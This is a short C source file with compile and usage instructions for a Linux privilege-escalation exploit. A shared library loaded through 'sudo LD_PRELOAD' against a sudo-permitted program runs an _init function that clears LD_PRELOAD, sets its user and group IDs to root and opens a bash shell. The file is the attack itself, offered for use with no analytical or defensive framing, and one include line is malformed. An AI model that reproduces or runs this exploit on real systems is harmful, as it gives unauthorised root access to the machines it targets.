/*
save this as file.c
complie with: gcc -fPIC -shared -o file.so file.c -nostartfiles
then run with LD_PRELOAD with sudo permission file as
sudo LD_PRELOAD=file-with-absolute-location/file.so sudo-file
example: sudo LD_PRELOAD=/home/user/file.so apache2
*/
#include <stdio.h>
#include <sys/types.h>
include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

